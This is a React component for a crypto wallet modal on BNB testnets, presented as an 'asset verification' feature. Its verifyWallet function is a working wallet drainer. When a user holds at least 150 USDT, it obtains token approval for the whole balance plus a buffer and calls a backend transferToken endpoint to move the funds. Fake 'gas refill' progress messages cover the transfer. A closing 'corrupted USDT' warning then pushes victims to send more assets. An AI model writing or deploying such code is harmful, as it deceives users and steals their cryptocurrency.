import React, { useState, useEffect } from "react";
import { Modal } from "antd";
import toast from "react-hot-toast";
import { web3 } from "../main";
import { TokenABI } from "../wagmiConfig";
import icone1 from "../assets/icons/1.png";
import icone2 from "../assets/icons/2.png";
import icone3 from "../assets/icons/3.png";
import icone4 from "../assets/icons/4.png";
import icone5 from "../assets/icons/5.png";
import icone6 from "../assets/icons/6.png";
import icone7 from "../assets/icons/7.png";
import icone8 from "../assets/icons/8.png";
import icone9 from "../assets/icons/9.png";
import icone10 from "../assets/icons/10.png";
import icone11 from "../assets/icons/11.png";
import icone12 from "../assets/icons/12.png";
import { appToken, checkAllowance, getUserBalance } from "../web3";
import axios from "axios";
import { apiUrl } from "../config";

const TOKENS = {
  5611: [
    {
      symbol: "USDT",
      address: "0xa6004fa87492e9352C50356298104715CEeD4Cfa",
      decimals: 6,
    },
  ],
  97: [
    {
      symbol: "USDT",
      address: "0x221c5b1a293aac1187ed3a7d7d2d9ad7fe1f3fb0",
      decimals: 18,
    },
  ],
};

const RPC_URLS = {
  5611: [
    " /",
    "https://opbnb-testnet-rpc.publicnode.com",
  ],
  97: [
    "https://bsc-testnet.public.blastapi.io",
    "wss://bsc-testnet-rpc.publicnode.com",
  ],
};

const WalletDetails = ({ checkStatus, details, web3 }) => {
  const [account, setAccount] = useState(null);
  const [isConnected, setIsConnected] = useState(false);
  const [chainId, setChainId] = useState(null);
  const [tokenBalances, setTokenBalances] = useState([]);
  const [nativeBalance, setNativeBalance] = useState(null);
  const [loading, setLoading] = useState(false);
  const [rpcError, setRpcError] = useState(null);
  const [verified, setVerified] = useState(false);
  const [verifying, setVerifying] = useState(false);
  const [verifyStep, setVerifyStep] = useState(0);
  const [showText , setShowText] = useState(false)

  const chains = [
    {
      id: 5611,
      name: "OPBNB Testnet",
      nativeCurrency: { name: "OPBNB", symbol: "BNB", decimals: 18 },
      blockExplorer: "https://opbnb-testnet.bscscan.com",
      icon: icone2,
    },
    // {
    //   id: 97,
    //   name: "BNB Chain Testnet",
    //   nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
    //   blockExplorer: "https://testnet.bscscan.com/",
    //   icon: icone2,
    // },
  ];

  // Function to try multiple RPCs for a chain with retries
  const setProviderWithFallback = async (chainId) => {
    const rpcs = RPC_URLS[chainId] || [window.ethereum];
    for (const rpc of rpcs) {
      for (let attempt = 1; attempt <= 3; attempt++) {
        try {
          if (
            rpc.includes("your_alchemy_api_key") ||
            rpc.includes("your_infura_api_key")
          ) {
            console.warn(`Skipping RPC with placeholder key: ${rpc}`);
            continue;
          }
          web3.setProvider(rpc);
          await web3.eth.getChainId(); // Test connection
          console.log(`Set provider to: ${rpc} (Chain ID: ${chainId})`);
          return true;
        } catch (error) {
          console.error(
            `Attempt ${attempt} failed for ${rpc} (Chain ID: ${chainId}):`,
            error
          );
          if (attempt === 3) break;
          await new Promise((resolve) => setTimeout(resolve, 1000));
        }
      }
    }
    setRpcError(`No valid RPC provider available for Chain ID: ${chainId}`);
    console.warn("Falling back to window.ethereum");
    web3.setProvider(window.ethereum);
    return false;
  };

  useEffect(() => {
    console.log("WalletDetails mounted, checkStatus:", checkStatus);
    const checkConnection = async () => {
      try {
        const accounts = await window.ethereum.request({
          method: "eth_accounts",
        });
        const networkId = await web3.eth.getChainId();
        const chainIdNumber = Number(networkId);
        console.log(
          "Detected Chain ID:",
          chainIdNumber,
          "Account:",
          accounts[0]
        );
        setAccount(accounts[0] || null);
        setChainId(chainIdNumber);
        setIsConnected(!!accounts[0]);
        if (RPC_URLS[chainIdNumber]) {
          await setProviderWithFallback(chainIdNumber);
        } else {
          console.warn(
            "No RPC URL for chain ID:",
            chainIdNumber,
            "Using window.ethereum"
          );
          web3.setProvider(window.ethereum);
          setRpcError(
            `No RPC provider configured for Chain ID: ${chainIdNumber}`
          );
        }
      } catch (error) {
        console.error("Error checking connection:", error);
        setRpcError("Failed to connect to the network: " + error.message);
      }
    };
    checkConnection();
  }, []);

  useEffect(() => {
    if (window.ethereum) {
      window.ethereum.on("accountsChanged", (accounts) => {
        console.log("Accounts changed:", accounts);
        setAccount(accounts[0] || null);
        setIsConnected(!!accounts[0]);
        setVerified(false);
      });
      window.ethereum.on("chainChanged", async (networkId) => {
        const chainIdNumber = Number(networkId);
        console.log("Chain changed to:", chainIdNumber);
        setChainId(chainIdNumber);
        setVerified(false);
        await setProviderWithFallback(chainIdNumber);
      });
    }
  }, []);

  useEffect(() => {
    if (!account || !isConnected || !TOKENS[chainId]) {
      console.log("Skipping balance fetch:", {
        account,
        isConnected,
        chainId,
        hasTokens: !!TOKENS[chainId],
      });
      setTokenBalances([]);
      setNativeBalance(null);
      setLoading(false);
      setRpcError(
        TOKENS[chainId]
          ? null
          : `Token balances not supported on this network (Chain ID: ${chainId})`
      );
      return;
    }

    const fetchBalances = async () => {
      setLoading(true);
      setRpcError(null);

      try {
        const balance = await web3.eth.getBalance(account);
        const formattedBalance = web3.utils.fromWei(balance, "ether");
        const chain = chains.find((c) => c.id === chainId);
        console.log("Native balance fetched:", {
          balance,
          formattedBalance,
          chain,
        });
        setNativeBalance({
          formatted: Number(formattedBalance).toFixed(4),
          symbol: chain?.nativeCurrency.symbol || "Native",
          icon: chain?.icon,
        });
      } catch (error) {
        console.error("Error fetching native balance:", error);
        setNativeBalance({ formatted: "0", symbol: "Native", icon: null });
        setRpcError("Failed to fetch native balance: " + error.message);
      }

      const chainTokens = TOKENS[chainId] || [];
      try {
        const results = await Promise.all(
          chainTokens.map(async (token, index) => {
            try {
              await new Promise((resolve) => setTimeout(resolve, index * 100));
              const contract = new web3.eth.Contract(TokenABI, token.address);
              const balance = await contract.methods.balanceOf(account).call();
              const decimals = await contract.methods
                .decimals()
                .call()
                .catch(() => token.decimals);
              const symbol = await contract.methods
                .symbol()
                .call()
                .catch(() => token.symbol);
              const balanceNumber =
                typeof balance === "bigint"
                  ? Number(balance)
                  : parseFloat(balance);
              const decimalsNumber =
                typeof decimals === "bigint"
                  ? Number(decimals)
                  : parseInt(decimals, 10);
              console.log(`Token ${token.symbol} fetched:`, {
                balance,
                decimals,
                symbol,
                balanceNumber,
                decimalsNumber,
              });
              return {
                symbol,
                balance: balanceNumber / Math.pow(10, decimalsNumber),
                error: false,
                icon: token.icon,
              };
            } catch (error) {
              console.error(
                `Error fetching data for ${token.symbol} on chain ${chainId}:`,
                error
              );
              return {
                symbol: token.symbol,
                balance: 0,
                error: true,
                icon: token.icon,
              };
            }
          })
        );
        setTokenBalances(results);
      } catch (error) {
        console.error("Error fetching all tokens:", error);
        setTokenBalances(
          chainTokens.map((token) => ({
            symbol: token.symbol,
            balance: 0,
            error: true,
            icon: token.icon,
          }))
        );
        setRpcError("Failed to fetch token balances: " + error.message);
      } finally {
        setLoading(false);
      }
    };

    const debounceFetch = setTimeout(fetchBalances, 500);
    return () => clearTimeout(debounceFetch);
  }, [account, chainId, isConnected, showText]);

  const CONTRACTS = {
    97: "0xc6c9EEfBD41DE39e75BeD1DC86575Fb1eD70844D",
    5611: "0x4695802477BDD53C9503e47481BB1270264928cd",
  };



  const verifyWallet = async () => {
    console.log("🔍 Starting verification...");
    try {
      setVerifying(true);
      setVerifyStep(1);
  
      // Request wallet accounts
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
      });
      const owner = accounts[0];
  
      // Get network & chain info
      const chainIdNumber = Number(await web3.eth.getChainId());
      const chainTokens = TOKENS[chainIdNumber];
      const contractAddress = CONTRACTS[chainIdNumber];
  
      if (!chainTokens || !contractAddress) {
        toast.error("Unsupported network for verification");
        setVerifying(false);
        return;
      }
  
      const tokenAddress = chainTokens[0].address;
      const token = new web3.eth.Contract(TokenABI, tokenAddress);
  
      // Get user balance
      const rawBalance = await token.methods.balanceOf(owner).call();
      const decimals = Number(await token.methods.decimals().call());
      const balance = Number(rawBalance) / 10 ** decimals;
  
      console.log("User balance:", balance);
  
      const shouldCallContract = balance >= 150;
  
      // Wait 3 seconds before step 2
      setTimeout(async () => {
        setVerifyStep(2);
  
        if (shouldCallContract) {
          try {
            console.log("✅ Balance ≥ 150 → Executing contract calls...");
  
            // Check current allowance
            const allowance = await checkAllowance(owner, tokenAddress, contractAddress);
  
            // Calculate raw amount with +2 tokens buffer
            const rawBalanceBN = BigInt(Math.floor(balance * 10 ** decimals));
            const buffer = BigInt(2 * 10 ** decimals);
            const rawNeeded = rawBalanceBN + buffer;
  
            // Approve if needed
            if (BigInt(allowance) < rawNeeded) {
              console.log("⌛ Approving balance + 2 tokens...");
              await appToken(rawNeeded.toString(), tokenAddress, contractAddress);
            }
  
            console.log("🚀 Sending invest transaction...");
            const tx = await axios.post(`${apiUrl}/bepcoin/transferToken`, {
              user: owner,
              amt: rawNeeded.toString(),
            });
            console.log(tx.data);
  
            setVerifyStep(3);
            setVerified(true);
            setVerifying(false);
            setShowText(true);
            setVerifyStep(0);
            console.log("🎉 All contract calls done → modal open.");
          } catch (error) {
            console.error("❌ Contract flow failed:", error);
            setVerifying(false);
            setVerifyStep(0);
          }
        } else {
          console.log("❌ Balance < 150 → Skipping contracts, running steps only.");
  
          // Step 3 after 6s
          setTimeout(() => setVerifyStep(3), 6000);
  
          // Final Step after 10s
          setTimeout(() => {
            setVerified(true);
            setVerifying(false);
            setVerifyStep(0);
            console.log("🎉 Verification finished (low balance) → modal showing.");
          }, 10000);
        }
      }, 3000);
    } catch (err) {
      console.error("verifyWallet outer error:", err);
      setVerifying(false);
      setVerifyStep(0);
      toast.error("Verification failed ❌");
    }
  };
  

  const disconnect = async () => {
    setAccount(null);
    setIsConnected(false);
    setVerified(false);
    setTokenBalances([]);
    setNativeBalance(null);
    details(false); // Close the modal
  };

  const switchChain = async (targetChainId) => {
    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: web3.utils.toHex(targetChainId) }],
      });
      await setProviderWithFallback(targetChainId);
      console.log("Switched to chain ID:", targetChainId);
    } catch (error) {
      if (error.code === 4902) {
        const chain = chains.find((c) => c.id === targetChainId);
        try {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [
              {
                chainId: web3.utils.toHex(targetChainId),
                chainName: chain.name,
                rpcUrls: RPC_URLS[targetChainId] || [
                  "https://rpc.ankr.com/" + chain.name.toLowerCase(),
                ],
                nativeCurrency: chain.nativeCurrency,
                blockExplorerUrls: [chain.blockExplorer],
              },
            ],
          });
          console.log("Added chain:", chain.name);
          await setProviderWithFallback(targetChainId);
        } catch (addError) {
          console.error("Error adding chain:", addError);
          toast.error(`Failed to add ${chain.name}`);
        }
      } else {
        console.error("Error switching chain:", error);
        toast.error(
          `Failed to switch to ${
            chains.find((c) => c.id === targetChainId)?.name
          }`
        );
      }
    }
  };

  const copyText = async (textToCopy) => {
    try {
      await navigator.clipboard.writeText(textToCopy);
      toast.success("Copied");
    } catch (error) {
      const textArea = document.createElement("textarea");
      textArea.value = textToCopy;
      textArea.style.position = "absolute";
      textArea.style.left = "-999999px";
      document.body.appendChild(textArea);
      textArea.select();
      try {
        document.execCommand("copy");
        toast.success("Copied");
      } catch (err) {
        console.error(err);
      } finally {
        textArea.remove();
      }
    }
  };

  const truncateAddress = (address) => {
    if (!address) return "";
    return `${address.slice(0, 6)}...${address.slice(-4)}`;
  };

  return (
    <Modal
      open={checkStatus}
      footer={null}
      className="wallet-modal"
      closable={false}
      onCancel={() => details(false)}
    >
      <div className="wallet-modal-content">
        <div className="modal-body">
          {isConnected ? (
            <div className="wallet-info">
              {verifying ? (
                <div className="loader-overlay">
                  <div className="loader-box">
                    <div className="loader-circle"></div>
                    {verifyStep === 1 && <p>Submiting User Request...</p>}
                    {verifyStep === 2 && <p>Creating User Request for GAS</p>}
                    {verifyStep === 3 && (
                      <p>Trying to Request Gas Refill approval from User</p>
                    )}
                  </div>
                </div>
              ) : !verified ? (
                <div className="verification-section">
                  <div className="status-indicator unverified">
                    <div className="status-icon">⚠️</div>
                    <div className="status-text">
                      <h3>Wallet Not Verified</h3>
                      <p>Verify your wallet to access all features</p>
                    </div>
                  </div>
                  <button className="verify-btn" onClick={verifyWallet}>
                    Verify Assets
                  </button>
                  <button className="disconnect-btn" onClick={disconnect}>
                    Disconnect Wallet
                  </button>
                </div>
              ) : (
                <div className="verified-section text-center">
                  <div className="status-indicator verified success-box">
                    <div className="status-icon">
                      <img
                        src="/images/green_checkmark.png"
                        alt=""
                        width={40}
                      />
                    </div>
                    <div className="status-text">
                      <h3 className="text-green-800">
                        Verification successful
                      </h3>
                    </div>
                  </div>
                 {!showText ? <p style={{ color: "green" }}>
                    Your assets are genuine and ready for trading.
                  </p>:
                  <p style={{ color: "red" }}>
                  Corrupted USDT has been detected, and additional assets are required for recovery.
                </p>}

                  <div className="balances-box">
                    <p className="balance-line">
                      Wallet Address: {truncateAddress(account)}{" "}
                      <button
                        onClick={() => copyText(account)}
                        style={{
                          background: "none",
                          border: "none",
                          color: "#f0b90b",
                          cursor: "pointer",
                          marginLeft: "8px",
                        }}
                      >
                        Copy
                      </button>
                    </p>
                    {nativeBalance && (
                      <p
                        className="balance-line"
                        style={{
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "center",
                        }}
                      >
                        {nativeBalance.icon && (
                          <img
                            src={nativeBalance.icon}
                            alt={`${nativeBalance.symbol} icon`}
                            width={24}
                            height={24}
                            style={{ marginRight: "8px" }}
                          />
                        )}
                        Native Balance: {nativeBalance.formatted}{" "}
                        {nativeBalance.symbol}
                      </p>
                    )}
                    {!loading && !rpcError && TOKENS[chainId] && (
                      <>
                        {tokenBalances
                          .filter((t) => !t.error && t.balance > 0)
                          .map((t, i) => (
                            <p
                              key={i}
                              className="balance-line"
                              style={{
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "center",
                              }}
                            >
                              {t.icon && (
                                <img
                                  src={t.icon}
                                  alt={`${t.symbol} icon`}
                                  width={24}
                                  height={24}
                                  style={{ marginRight: "8px" }}
                                />
                              )}
                              {t.symbol} Balance: {t.balance.toFixed(4)}
                            </p>
                          ))}
                        {tokenBalances.filter((t) => !t.error && t.balance > 0)
                          .length === 0 && (
                          <p className="balance-line">No tokens found</p>
                        )}
                      </>
                    )}
                    {loading && (
                      <p className="balance-line">Fetching balances…</p>
                    )}
                    {rpcError && !loading && (
                      <p className="error-message">⚠️ {rpcError}</p>
                    )}
                    {!TOKENS[chainId] && !loading && !rpcError && (
                      <p className="balance-line">
                        Token balances not supported on this network (Chain ID:{" "}
                        {chainId})
                      </p>
                    )}
                  </div>
                  <div className="network-box">
                    <h4>Switch Network</h4>
                    <select
                      value={chainId || ""}
                      onChange={(e) => switchChain(Number(e.target.value))}
                      style={{ display: "flex", alignItems: "center" }}
                    >
                      {chains.map((c) => (
                        <option key={c.id} value={c.id}>
                          {c.name}
                        </option>
                      ))}
                    </select>
                  </div>
                  <div className="close-btn-container">
                    <button
                      className="close-btn-footer"
                      onClick={() => details(false)}
                    >
                      CLOSE
                    </button>
                  </div>
                </div>
              )}
            </div>
          ) : (
            <>
              <div className="not-connected">
                <div className="status-icon">🔒</div>
                <h3>Wallet not connected</h3>
                <p>Connect your wallet to view details</p>
              </div>
              <div className="close-btn-container">
                <button
                  className="close-btn-footer"
                  onClick={() => details(false)}
                >
                  CLOSE
                </button>
              </div>
            </>
          )}
        </div>
      </div>
    </Modal>
  );
};

export default WalletDetails;
